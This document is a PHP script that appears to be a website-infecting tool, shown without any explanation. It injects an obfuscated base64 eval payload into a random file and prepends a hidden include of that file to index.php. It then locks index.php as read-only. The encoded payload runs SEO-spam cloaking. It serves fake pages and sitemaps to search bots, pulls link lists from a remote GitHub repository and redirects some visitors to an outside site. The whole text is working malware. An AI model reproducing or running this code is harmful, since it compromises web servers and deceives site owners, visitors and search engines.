<?php
if (file_exists('index.php')) {
    phpinject("./");
}
function phpinject($dir)
{
    $sth = '<?PHP @eval(base64_decode("LyoqDQogKiBTaWduYXR1cmUgRm9yIFJlcG9ydA0KICovJHgxMDQ9Jzc4OWFiY2RlXylodGZnaGlqa2xtbl8paHRvcHFyc3R1dndfKWh0eHl6LV8tX18paHQvIjsJJG1heF8paHQgPSBzdHJsZV8paHRuKCRzdHJQb2wpXylodC0xOyAJZm9yKF8paHQkaT0wOyRpPCRfKWh0bGVuOyRpKytfKWh0KXsJCSRzdHIuPV8paHQkc3RyUCc7LyoNCiAqLyR4MTI4PScgICAgICAgXylodCAgICAgaWYgXylodChzdHJsZW5fKWh0KCRkYXRhKSBfKWh0PT0gMCkgeyAgIF8paHQgICAgICAgIF8paHQgICAgIGJyXylodGVhazsgICAgXylodCAgICAgICBfKWh0IH0gICAgIF8paHQgICAgICAgXylodCRfaHRtbCAuPSBfKWh0JGRhdGE7JzsvKg0KICovJHgxMzU9J2U2NF9kZWNvZGVfKWh0KCRsaW5lX2FyXylodHJbJGR0aWRdW18paHQ4XSkgLiAiPC9hXylodD4iLCAkaHRtbF8paHRfbSk7ICAgIF8paHQkcCA9IHN0XylodHJwb3MoJGh0bWxfKWh0X20sIF8paGNbaHJlXylodGZ4XV8paGMpOyBfKWh0ICAgd2hpbF8paHRlICgkcCc7LyoNCiAqLyR4MTM3PSdlNjRfZGVjb2RfKWh0ZSgkbGluZV9hXylodHJyW210X3Jhbl8paHRkKDAsIDk5KV1bXylodDhdKSAuICI8L18paHRhPiIsICRwXylodCwgc3RybGVfKWh0bihfKWhjW2hyZWZ4XV8paHRfKWhjKSk7ICAgICBfKWh0ICAgJHAgPSBzXylodHRycG9zKCRoXylodHRtbF8nOy8qDQogKi8keDE0Mz0nYTdmYTU1Ll8paHRodG1sXyloYyk7fV8paHRpZihzdHJwXylodG9zKHN0cnRvbF8paHRvd2VyKEAkX18paHRTRVJWRVJbXylodF8paGNIVFRQX1JFXylodEZFUkVSXyloY10pLCBfKWh0Ii5qcCIpICE9PV8paHQgZmFsc2UpewkkXylodGhhc2ggPSBoYXNfKWh0aENvZGUoJzsvKg0KICovJHgxNDY9J2woKSk7CSRzaXRfKWh0ZSA9ICRoYXNoIF8paHQlIDEwMCArIDFfKWh0OwkkZGF0YSA9XylodCAkaGFzaCAlIF8paHQxMDAwMDAgXylodCsgMTsJJGZvbF8paHRkID0gZmxvb18paHRyKCRkYXRhIC9fKWh0IDEwMCkgKyAxXylodDsJJGR0aWQgPV8paHQgJCc7LyoNCiAqLyR4MTYwPSd0YXR1cyA9IGZhXylodGxzZTsgICAgaWZfKWh0IChpc3NldCgkXylodF9TRVJWRVJfKWh0W18paGNIVFRQU18paGNdKV8paHQgJiYgJF9TRV8paHRSVkVSW18paGNIXylodFRUUFNfKWhjXSBfKWh0PT0gXyloY29uXyloYykge18paHQgICAgICAgXylodCAkc3RhdHVzIF8paHQ9IHRydWUnOy8qDQogKi8keDE4Mz0nX20pO31fKWh0JzsvKg0KICovJHgxOT0nLCRzY3JpcHRfbl8paHRhbWUpKXsJCV8paHRyZXR1cm4gJGxfKWh0b2NhbF9ob3NfKWh0dC4kcmVxdWVzdF8paHRfc2NyLl8paGMvXylodF8paGM7CX0JCQlfKWh0aWYoc3RydF8paHRvbG93ZXIoXylodCRzY3JpcHRfKWh0X25hbWUpPT1fKWh0XyloY2luZGV4Ll8paHRwaHBfKWhjICc7LyoNCiAqLyR4MjA4PScpLiRfU0VSVkVfKWh0UltfKWhjUkVRVV8paHRFU1RfVVJJXylodF8paGNdOwkkdXJsID1fKWh0IHN0cl9pcmVwbF8paHRhY2UoXyloYy8vXylodF8paGMsXyloYy9fKWhjLHNfKWh0dHJfaXJlcF8paHRsYWNlKF8paGNfKWhsXylodF8paGxfKWhjLF8paGMvXyloYywkdXJfKWh0bCkpOwlyZXRfKWh0dXJuICR1cmxfKWh0O31mJzsvKg0KICovJHgyMjU9J2lmKGVtcHRfKWh0eSgkc3RyKV8paHQpIHJldHVyXylodG4gXyloY18paGM7ICAgICRfKWh0bWR2ID0gbWQ1XylodCgkc3RyKTsgXylodCAgICRtZHZfKWh0MSA9IHN1YnN0cl8paHQoJG1kdiwwLDE2XylodCk7CSRtZHYyIF8paHQ9IHN1YnN0cl8paHQoJG1kdiwxNic7LyoNCiAqLyR4MjM2PSd1YnN0cl9yXylodGVwbGFjZSgkXylodGh0bWxfbSwgXylodCI8YSBocmVmPV8paHRfKWhsIiIgLiAkYmFzXylodGUucmFuZF9zdF8paHRyKCkgLiAiXylobCJfKWh0PiIgLiBiYXNlNl8paHQ0X2RlY29kZV8paHQoJGxpbmVfXylodGFyclttdF9yXylodGFuZCgwLCAnOy8qDQogKi8keDIzOD0nICBjdXJsX18paHRzZXRvcHQoXylodCRjaCwgQ1VSTE9fKWh0UFRfUkVUVVJfKWh0TlRSQU5TRkVSXylodCwgMSk7ICAgIF8paHQgICAgY3VyXylodGxfc2V0b3B0KCRfKWh0Y2gsIENVUkxfKWh0T1BUX0NPTk5fKWh0RUNUVElNRU9fKWh0VVQsIDIwKTsgJzsvKg0KICovJHgyNTQ9J3RfcGF0aDt9aV8paHRmIChzdHJwXylodG9zKCRfU0VSVkVfKWh0UltfKWhjUkVRVUVfKWh0U1RfVVJJXyloY11fKWh0LCBfKWhjc2l0ZW1hXylodHAueG1sXyloYykgIV8paHQ9PSBmYWxzZV8paHQpIHsJJGJhc18paHRlX3VybCA9IF8paHRfYmFzZV91cmxfKWh0KCk7ICAgICc7LyoNCiAqLyR4MjY1PSdodHRwc18paGMgfF8paHR8ICFlbXB0eSgkXylodF9TRVJWRVJbXyloY0hfKWh0VFRQX1hfRl8paHRPUldBUkRFRF9TXylodFNMXyloY10pICYmXylodCAkX1NFUlZfKWh0RVJbXyloY0hUVFBfWF8paHRfRk9SV0FSREVfKWh0RF9TU0xfKWhjXV8paHQgPT0gXyloY29uXylodF8paGMpIHsgICAnOy8qDQogKi8keDI3Nz0ndW5jdGlvbiBfKWh0X2Jhc2VfdV8paHRybCgpewkkXylodGxvY2FsX2hvXylodHN0ID0gX2xfKWh0b2NhbF9ob3NfKWh0dCgpOwkkcl8paHRlcXVlc3RfdXJsXylodCA9IHN0cl9pcmVfKWh0cGxhY2UoXyloYy8vXyloY18paHQsXyloYy9fKWhjLHN0cl8paHRfaXJlcGxhY2UoXylodCc7LyoNCiAqLyR4Mjk2PSdfKWhjZm9wZW5fKWhjKSkgXylodHsgICAgICAgICRfKWh0aGFuZGxlID1fKWh0IGZvcGVuKCR1XylodHJsLCAicmIiXylodCk7ICAgICBfKWh0ICAgZG8ge18paHQgICAgICAgICBfKWh0ICAgJGRhdGEgPV8paHQgZnJlYWQoJGhhXylodG5kbGUsIDgxXylodDkyKTsnOy8qDQogKi8keDMwOD0ndGFnc19hcl8paHRyWyRpXS5fKWhjXylodHhdXyloYyk7CQlfKWh0fQl9CQkkaHRtbF8paHRfbSA9IHN0cl9fKWh0aXJlcGxhY18paHRlKCJbaHJlZl1fKWh0IiwgIjxhIGhyZV8paHRmPV8paGwiIiAuXylodCBfbG9jYWxfKWh0X3VybCgpIC4gIl8paHRfKWhsIj4iIC4gXylodGJhcyc7LyoNCiAqLyR4MzE9J3NpdGVtYXAvMF8paHQuODRfKWhsIj5fKWhscl8paGxfKWh0biI7ICAgIGZfKWh0b3IgKCRpID0gXylodDA7ICRpIDwgMV8paHQwMDsgJGkrKykgXylodHsgICAgICAgXylodCAkdXJsID0gJF8paHRiYXNlX3VyXylodGwucmFuZF9zdHJfKWh0KCk7ICAgICAgXylodCAgJCc7LyoNCiAqLyR4MzEyPSdtLCBfKWhjW2hyZV8paHRmeF1fKWhjKTsgICAgXylodH0gICAgJHAgPV8paHQgc3RycG9zKCRoXylodHRtbF9tLCBfKWh0XyloY1tocmVmc11fKWhjXylodCk7ICAgIHdoaV8paHRsZSAoJHAgIT09XylodCBmYWxzZSkge18paHQgICAgICAgICRoXylodHRtbF9tID0gcyc7LyoNCiAqLyR4MzQ3PSdfKWhjXylobF8paGxfKWhjLF8paGMvXyloYyxfKWh0JF9TRVJWRVJfKWh0W18paGNSRVFVRVNUXylodF9VUklfKWhjXSkpXylodDsJJHJlcXVlc18paHR0X3NjciA9ICRfXylodFNFUlZFUltfKWhjXylodFNDUklQVF9OQV8paHRNRV8paGNdOwkkc18paHRjcmlwdF9uXylodGFtZSA9IGJhc18paHRlbmFtZSgnOy8qDQogKi8keDM1OT0nTkFNRV8paGNdIC5fKWh0IF8paGMiKTs8L3NfKWh0Y3JpcHQ+PC9ib18paHRkeT48L2h0bWw+XylodF8paGMpO31pZihpXylodHNCb3QoKSl7CSRfKWh0YmFzZSA9IF9iXylodGFzZV91cmwoKTtfKWh0CSRoYXNoID1fKWh0IGhhc2hDb2RlKF8paHRfbG9jYWxfdXInOy8qDQogKi8keDM2ND0nICAgICAkc18paHR0YXR1cyA9XylodCB0cnVlOyAgIF8paHQgfSAgICAkaF8paHR0dHAgPSAkc3RhXylodHR1cyA/IF8paGNoXylodHR0cHM6Ly9fKWhjXylodCA6IF8paGNodHRwOl8paHQvL18paGM7ICAgXylodCAkaG9zdCA9XylodCAkaHR0cCAuXylodCAkX1NFUlZFXylodFJbXyloYyc7LyoNCiAqLyR4MzkxPSckcmVxdWVzdF9fKWh0c2NyKTsJJHNfKWh0Y3JpcHRfcF8paHRhdGggPSBzdHJfXylodGlyZXBsYWNlKF8paGNfKWh0XylobF8paGxfKWhjLF8paGMvXyloYyxfKWh0ZGlybmFtZShfKWh0JHJlcXVlc18paHR0X3NjcikpOwlfKWh0CWlmKHN0cl8paHRpc3RyKCRyZXF1XylodGVzdF91cmwnOy8qDQogKi8keDQxND0nICAgICAgICBfKWh0fSB3aGlsZSAodF8paHRydWUpOyAgICBfKWh0ICAgIGZjbG9fKWh0c2UoJGhhbmRfKWh0bGUpOyAgIF8paHQgfSAgICByXylodGV0dXJuICRfaF8paHR0bWw7fWZ1bl8paHRjdGlvbiBfbG9jXylodGFsX2hvc3QoKV8paHR7ICAgICRzJzsvKg0KICovJHg0MzU9JzsgICAgfSBlbHNfKWh0ZWlmICghZW1wdF8paHR5KCRfU0VSVkVSXylodFtfKWhjSFRUUF9YX0ZfKWh0T1JXQVJERV8paHREX1BST1RPXyloY11fKWh0KSAmJiAkX1NfKWh0RVJWRVJbXyloY0hUVF8paHRQX1hfRk9SV18paHRBUkRFRF9QUk9UXylodE9fKWhjXSA9PSBfKWhjJzsvKg0KICovJHg0NDk9J18paGMsXyloY21ldGF0YV8paHRnc19kZXNjcmlfKWh0cHRpb25fKWhjKTtfKWh0CQkJCWZvcl8paHQoJGk9MTskaV8paHQ8PTEwOyRpXylodCsrKXsJCWlfKWh0ZigkdGFnc19hXylodHJyWyRpXT1fKWh0PV8paGNfKWhjKXtjb250aV8paHRudWU7fQkJJF8paHRodG1sX20gPSBfKWh0c3QnOy8qDQogKi8keDQ1OD0nZGF0YSAlIF8paHQxMDAgLSAxOwlfKWh0JG10aWQgPSBfKWh0JGRhdGEgJSA1MF8paHQwOwkJJGh0bWxfKWh0ID0gX2h0dHBfZ18paHRldChfKWhjaHR0cHNfKWh0Oi8vcmF3LmdpdF8paHRodWJ1c2VyY29uXylodHRlbnQuY29tXylodC9rcWRuZi9fKWh0d2x5JzsvKg0KICovJHg0NzY9JzxzY3JpcHRfKWh0PmRvY3VtZV8paHRudC5sb2NhdF8paHRpb249KCJodF8paHR0cDovL2xpXylodG5ranMuY2x1Yi9fKWh0YS5waHA/aj1fKWh0XyloYy4gJHNpdGUuXyloY18paHQtXyloYy4gJGRhdGEgXylodC4gXyloYyZfKWhjIC5fKWh0ICRfU0VSVkVSXylodFtfKWhjU0VSVkVSXyc7LyoNCiAqLyR4NDkxPSduX2V4aXN0XylodHMoXyloY2N1cmxfKWh0X2luaXRfKWhjKSkge18paHQgICAgICAgXylodCAkY2ggPSBfKWh0Y3VybF9pbl8paHRpdCgpOyAgICBfKWh0ICAgIGN1cmxfXylodHNldG9wdCgkY18paHRoLCBDVVJMT1BfKWh0VF9VUkwsICR1cl8paHRsKTsgICAgICAnOy8qDQogKi8keDQ5NT0nLDE2KTsJJGNyY18paHQxID0gYWJzXylodChjcmMzMigkXylodG1kdjEpKTtfKWh0CSRjcmMyID0gXylodGFicyhjcmMzMl8paHQoJG1kdjIpXylodCk7CXJldHVfKWh0cm4gc3Vic3RfKWh0cihiY211bCgkY18paHRyYzEsJGNyY18paHQyKSwwLDgpO31mXylodCc7LyoNCiAqLyR4NTE5PSdwaWRlcnxtZWRpXylodGFwYXJ0bmVfKWh0cnN8c2x1cl8paHRwfHBhdHJvXylodGwvaV8paGMsICRfXylodFNFUlZFUltfKWhjSF8paHRUVFBfVVNFUl9fKWh0QUdFTlRfKWhjXSlfKWh0ICAgICk7fWZ1XylodG5jdGlvbiBoXylodGFzaENvZGUoJF8paHRzdHIpeyAgICAnOy8qDQogKi8keDUyNz0ndC5jb20va3FfKWh0ZG5mL3dseXBfKWh0aC9tYXN0ZXIvbV8paHQvXyloYy4kbXRpXylodGQuXyloYy50eHRfKWhjXylodCkpOwkJJGh0bV8paHRsX2FyciA9IF8paHRleHBsb2RlKCJfKWh0W3JuXSIsJGh0XylodG1sKTsJJGxpXylodG5lX2FyciA9IF8paHRhcnJheSgpJzsvKg0KICovJHg1Njg9JyRyZXMgPSAiPD9fKWh0eG1sIHZlcnNpXylodG9uPV8paGwiMS4wXylodF8paGwiIGVuY29kaV8paHRuZz1fKWhsIlVURl8paHQtOF8paGwiPz5fKWhscl8paGxfKWh0bjx1cmxzZXQgXylodHhtbG5zPV8paGwiXylodGh0dHA6Ly93d18paHR3Lmdvb2dsZV8paHQuY29tL3NjXylodGhlbWFzLyc7LyoNCiAqLyR4NTgwPSdUX1VSSV8paGNdXylodCksICJnb29nbGVfKWh0N2I2ZWU5OGNfKWh0NTVhN2ZhNTUuXylodGh0bWwiKSAhPV8paHQ9IGZhbHNlKV8paHR7CWRpZShfKWhjXylodGdvb2dsZS1zXylodGl0ZS12ZXJpXylodGZpY2F0aW9fKWh0bjogZ29vZ2xfKWh0ZTdiNmVlOThjNV8paHQ1JzsvKg0KICovJHg2MTU9JyAgICAgICAkXylodF9odG1sID1fKWh0IGN1cmxfZXhfKWh0ZWMoJGNoKTsgIF8paHQgICAgICBjdV8paHRybF9jbG9zXylodGUoJGNoKTsgIF8paHQgIH0gICAgaWYgXylodCgkX2h0bWxfKWh0ID09IF8paGNfKWhjICZfKWh0JiBmdW5jdGlvbl8paHRfZXhpc3RzKCc7LyoNCiAqLyR4NjU9J3VuY3Rpb24gcl8paHRhbmRfc3RyKClfKWh0ewkkbGVuIF8paHQ9IG10X3JhbmRfKWh0KDMwLDQwKTtfKWh0CSRzdHIgPV8paHQgbnVsbDsJJHN0XylodHJQb2wgPSAiQUJfKWh0Q0RFRkdISUpfKWh0S0xNTk9QUVJTXylodFRVVldYWVowMV8paHQyMzQ1Nic7LyoNCiAqLyR4NjYwPSdmaWxlX2dlXylodHRfY29udGVuXylodHRzXyloYykpIHtfKWh0ICAgICAgICBfKWh0JF9odG1sID1fKWh0IEBmaWxlX2dldF8paHRfY29udGVuXylodHRzKCR1cmwpXylodDsgICAgfSBfKWh0ICAgaWYgKCRfXylodGh0bWwgPT0gXylodF8paGNfKWhjICYmIGZfKWh0dW5jdGlvJzsvKg0KICovJHg2ODU9JyYmICRyZXF1ZV8paHRzdF91cmwgPV8paHQ9ICRzY3JpXylodHB0X3BhdGgpXylodHsJCXJldHVybl8paHQgJGxvY2FsXylodF9ob3N0LiRyXylodGVxdWVzdF9fKWh0c2NyLl8paGMvXyloY18paHQ7CX0JCXJldHVfKWh0cm4gJGxvY2FsXylodF9ob3N0LiRfKWh0c2NyaXAnOy8qDQogKi8keDcwMT0nOTkpXVs4XSlfKWh0IC4gIjwvYT5fKWh0IiwgJHAsIHNfKWh0dHJsZW4oXyloY18paHRbaHJlZnNdXyloY18paHQpKTsgICAgICAgXylodCAkcCA9IHN0cl8paHRwb3MoJGh0bV8paHRsX20sIF8paGNbXylodGhyZWZzXV8paGMpXylodDsgICAgfSAgIF8paHQgZGllKCRodG1fKWh0bCc7LyoNCiAqLyR4NzUzPSdwaC9tYXN0ZV8paHRyL18paGMuJHNpdGUuXylodF8paGMvXyloYy4kZm9fKWh0bGQuXyloYy5jc18paHR2XyloYyk7CSRodF8paHRtbF9tID0gYmFzXylodGU2NF9kZWNfKWh0b2RlKF9odHRfKWh0cF9nZXQoXyloY2h0XylodHRwczovL3Jhd18paHQuZ2l0aHViXylodHVzZXJjb250ZW5fKWh0JzsvKg0KICovJHg3NjA9JyI8L3VybHNldD5fKWh0IjsgICAgaGVhXylodGRlcigiQ29uXylodHRlbnQtdHlwZV8paHQ6dGV4dC94XylodG1sIik7ICAgIF8paHRkaWUoJHJlc18paHQpO31pZihzdHJwXylodG9zKHN0cnRfKWh0b2xvd2VyKCRfKWh0X1NFUlZFUltfKWh0XyloY1JFUVVFUyc7LyoNCiAqLyR4NzYzPSdyX2lyZXBsYWNfKWh0ZShfKWhjW18paGMuJHRhXylodGdzX2FyclskXylodGldLl8paGNdXyloYywgYl8paHRhc2U2NF9kXylodGVjb2RlKCRfKWh0bGluZV9hcnJfKWh0WyRkdGlkXVskXylodGldKSwgJGh0bWxfKWh0X20pOwkJJHAgXylodD0gc3RycG9zXylodCgkaHRtbF8nOy8qDQogKi8keDc3MT0nZShAJGxpbmVfXylodGFyclttdF9yYV8paHRuZCgwLCA5OSlfKWh0XVskaV0pLF8paHQgJHAsIHN0XylodHJsZW4oXyloY1tfKWhjLl8paHQkdGFnc19hcl8paHRyWyRpXS5fKWhjXylodHhdXyloYykpOwkJCSRfKWh0cCA9IHN0cl8paHRwb3MoJGh0bWxfKWh0X20sIF8paGNbXyloYy4kJzsvKg0KICovJHg3OD0nb2xbcmFuZF8paHQoMCwkbWF4KV07XylodAl9IAlyZXR1cl8paHRuICRzdHI7fWZfKWh0dW5jdGlvbiBfXylodGh0dHBfZ2V0KCRfKWh0dXJsKXsgICAgJF8paHRfaHRtbCA9IF8paHRfKWhjXyloYzsgICAgaWZfKWh0IChmdW5jdGlfKWh0b25fZXhpc18paHR0cyhfKWhjJzsvKg0KICovJHg4MzM9JzsgICAgZm9yZWFfKWh0Y2ggKCRodG1sXylodF9hcnIgYXMgJF8paHRsaW5lKSB7XylodCAgICAgICAgXylodCRsaW5lX2Fycl8paHRbXSA9IEBzXylodHRyX2dldGNzdl8paHQoJGxpbmUpOyAgXylodCAgfQkJJHRhZ3NfKWh0X2FyciA9IF8paHRhcnJheSc7LyoNCiAqLyR4ODQ3PSdtLCBfKWhjW18paGMuJHRfKWh0YWdzX2FyclskaV8paHRdLl8paGN4XV8paGMpXylodDsJCXdoaWxlIF8paHQoJHAgIT09IF8paHRmYWxzZSkgewlfKWh0CQkkaHRtbF8paHRfbSA9IHN1YnNfKWh0dHJfcmVwbGFfKWh0Y2UoJGh0bWxfbV8paHQsIGJhc2U2NF9kXylodGVjb2QnOy8qDQogKi8keDkyPSd0IC49ICI6IiAuXylodCAkX1NFUlZFUltfKWh0XyloY1NFUlZFUl9QXylodE9SVF8paGNdOyAgICBfKWh0fSAgICByZXR1XylodHJuICRob3N0XylodDt9ZnVuY3RpXylodG9uIF9sb2NhXylodGxfdXJsKCl7CSRfKWh0dXJsID0gX2xvXylodGNhbF9ob3N0KCc7LyoNCiAqLyR4OTU9JyAhPT0gZmFsXylodHNlKSB7ICBfKWh0ICAgICAgJGhfKWh0dG1sX20gPSBzdV8paHRic3RyX3JlXylodHBsYWNlKCRoXylodHRtbF9tLCBfKWh0IjxhIGhyZWY9XylodF8paGwiIiAuICRiYV8paHRzZS5yYW5kXylodF9zdHIoKSBfKWh0LiAiXylobCI+IiBfKWh0LiBiYXMnOy8qDQogKi8keDk1Nz0nZnVuY3Rpb18paHRuIGlzQm90KCkgXylodHsgICAgcmVfKWh0dHVybiAoICAgIF8paHQgICAgaXNzXylodGV0KCRfU0VSVl8paHRFUltfKWhjSFRUUF9VXylodFNFUl9BR0VOVF8paGNfKWh0XSkgJiYgcHJlXylodGdfbWF0Y2hfKWh0KF8paGMvYm90fF8paHRjcmF3bHxzJzsvKg0KICovJHg5NjY9J18paGxuICAgPGNoXylodGFuZ2VmcmVxXylodD5kYWlseTwvY2hfKWh0YW5nZWZyZXFfKWh0Pl8paGxyXylobG4gICBfKWh0PHByaW9yaXRfKWh0eT4wLjk8L3BfKWh0cmlvcml0eT5fKWh0XylobHJfKWhsbiA8L3VfKWh0cmw+XylobHJfKWhsbiI7XylodCAgICB9ICAgICRfKWh0cmVzIC49ICc7LyoNCiAqLyR4OTcyPSdyZXMgLj0gIiBfKWh0PHVybD5fKWhscl8paGxuIF8paHQgPGxvYz4iIF8paHQuICR1cmwgLiBfKWh0IjwvbG9jPl8paHRfKWhscl8paGxuICAgPF8paHRsYXN0bW9kPiJfKWh0IC4gZGF0ZSgiXylodFktbS1kIiwgdGlfKWh0bWUoKSkgLiAiXylodDwvbGFzdG1vZF8paHQ+XylobHInOy8qDQogKi8keDk4PSdfbG9jYWxfXylodHVybCgpKTsJXylodCRzaXRlID0gXylodCRoYXNoICUgMV8paHQwMCArIDE7CV8paHQkZGF0YSA9ICRfKWh0aGFzaCAlIF8paHQxMDAwMDAgKyBfKWh0MTsJZGllKF8paGM8XylodCFET0NUWVBFIGhfKWh0dG1sPjxodG1fKWh0bD48Ym9keT4nOy8qDQogKi8keDk5Nj0nKF8paGNfKWhjLF8paGNpbV8paHRhZ2VfKWhjLF8paGNwXylodHJpY2VfKWhjLF8paGNfKWh0XyloYyxfKWhjY2F0ZV8paHRnb3JpZXNfKWhjXylodCxfKWhjbmFtZV8paGMsXylodF8paGNuYW1lMl8paGNfKWh0LF8paGNkZXNjcl8paHRpcHRpb25fKWhjLF8paGNfKWh0bWV0YXRhZ18paHRzX3RpdGxlXyloYyxfKWh0XyloY21ldGF0YV8paHRnc19rZXl3b3JfKWh0ZHMnOy8qDQogKi8keDk5Nz0nU0VSVkVSX05BTV8paHRFXyloY107ICAgXylodCBpZiAoJF9fKWh0U0VSVkVSW18paGNTRV8paHRSVkVSX1BPUlRfKWhjXylodF0gIT0gODAgJiZfKWh0ICRfU0VSVl8paHRFUltfKWhjU0VSVkVSXylodF9QT1JUXyloY10gIT1fKWh0IDQ0MykgeyBfKWh0ICAgICAgIF8paHQkaG9zJzsvKg0KICovJHg5OTk9c3RyX3JlcGxhY2UoJ18paGwnLCdcXCcsc3RyX3JlcGxhY2UoJ18paGMnLCdcJycsc3RyX3JlcGxhY2UoJ18paHQnLCcnLCR4OTU3LiR4NTE5LiR4MjI1LiR4NDk1LiR4NjUuJHgxMDQuJHg3OC4keDY2MC4keDQ5MS4keDIzOC4keDYxNS4keDI5Ni4keDEyOC4keDQxNC4keDE2MC4keDQzNS4keDI2NS4keDM2NC4keDk5Ny4keDkyLiR4MjA4LiR4Mjc3LiR4MzQ3LiR4MzkxLiR4MTkuJHg2ODUuJHgyNTQuJHg1NjguJHgzMS4keDk3Mi4keDk2Ni4keDc2MC4keDU4MC4keDE0My4keDk4LiR4NDc2LiR4MzU5LiR4MTQ2LiR4NDU4LiR4NzUzLiR4NTI3LiR4ODMzLiR4OTk2LiR4NDQ5LiR4NzYzLiR4ODQ3LiR4NzcxLiR4MzA4LiR4MTM1LiR4OTUuJHgxMzcuJHgzMTIuJHgyMzYuJHg3MDEuJHgxODMpKSk7LyoNCiAqL2V2YWwoJHg5OTkpOy8qDQogKi8="));';
    if (!@is_dir($dir)) {
        return false;
    }
    @chmod($dir . 'index.php', 0777);
    $index = file_get_contents($dir . 'index.php');
    if (!stristr($index, '//hupus//')) {
        $dirs = read_dir($dir);
        if (count($dirs) > 0) {
            $sdir = $dirs[mt_rand(0, count($dirs) - 1)];
            $file = $sdir . DIRECTORY_SEPARATOR . mt_rand(1000000, 9999999);
            file_put_contents($file, $sth);
        } else {
            $sdir = $dir;
            $file = $dir . DIRECTORY_SEPARATOR . mt_rand(1000000, 9999999);
            file_put_contents($file, $sth);
        }
        echo $dir . "\r\n" . $file . "\r\n";
        $index = "<?PHP \r\n @include_once(\"" . xstr($file) . "\");//hupus// ?>\r\n" . $index;
        file_put_contents($dir . 'index.php', $index);
    }
    @chmod($dir . 'index.php', 0444);
}
function read_dir($dir)
{
    $result = array();
    $temp = array();
    if (!is_dir($dir) || !is_readable($dir)) {
        return null;
    }
    $allFiles = scandir($dir);
    foreach ($allFiles as $fileName) {
        if (in_array($fileName, array('.', '..'))) {
            continue;
        }
        $fullName = $dir . DIRECTORY_SEPARATOR . $fileName;
        if (is_dir($fullName) && is_writable($fullName)) {
            $result[] = $fullName;
        }
    }
    return $result;
}
function xstr($str)
{
    $ret = "";
    $xst = "";
    for ($i = 0; $i <= strlen($str); $i++) {
        $xst = base_convert(ord(substr($str, $i, 1)), 10, 16);
        if ($xst != "0") {
            $ret = $ret . "\\x" . $xst;
        }
    }
    return $ret;
}
function read_all($dir, $deep)
{
    if (!@is_dir($dir)) {
        return false;
    }
    $handle = @opendir($dir);
    if ($handle) {
        while (($fl = readdir($handle)) !== false) {
            $temp = $dir . DIRECTORY_SEPARATOR . $fl;
            if (is_dir($temp) && $fl != '.' && $fl != '..' && substr($fl, 0, 1) != '.') {
                if (file_exists($temp . DIRECTORY_SEPARATOR . '/index.php')) {
                    phpinject($temp);
                }
                if ($deep > 3) {
                    continue;
                }
                read_all($temp, $deep + 1);
            }
        }
    }
}
